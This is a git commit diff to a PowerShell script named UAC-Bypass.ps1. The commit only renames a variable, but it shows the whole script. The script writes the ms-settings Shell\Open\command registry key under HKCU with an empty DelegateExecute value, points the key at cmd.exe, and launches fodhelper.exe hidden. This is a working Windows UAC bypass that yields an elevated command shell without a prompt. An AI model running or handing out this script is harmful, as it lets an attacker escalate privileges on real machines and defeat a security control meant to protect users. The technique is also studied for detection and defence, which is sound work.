a94c7a5d7ae9babf411fc87301d1151744a158f2
krishanthGit <51735357+krishanthGit@users.noreply.github.com>
2020-11-14 01:07:30 +0530

    Update UAC-Bypass.ps1

--- UAC-Bypass.ps1
+++ UAC-Bypass.ps1
@@ -1,10 +1,10 @@
 #UAC-Bypass script
 
-$krishcommand = "C:\Windows\System32\cmd.exe"
+$krish = "C:\Windows\System32\cmd.exe"
 
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $krishcommand -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $krish -Force
 
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
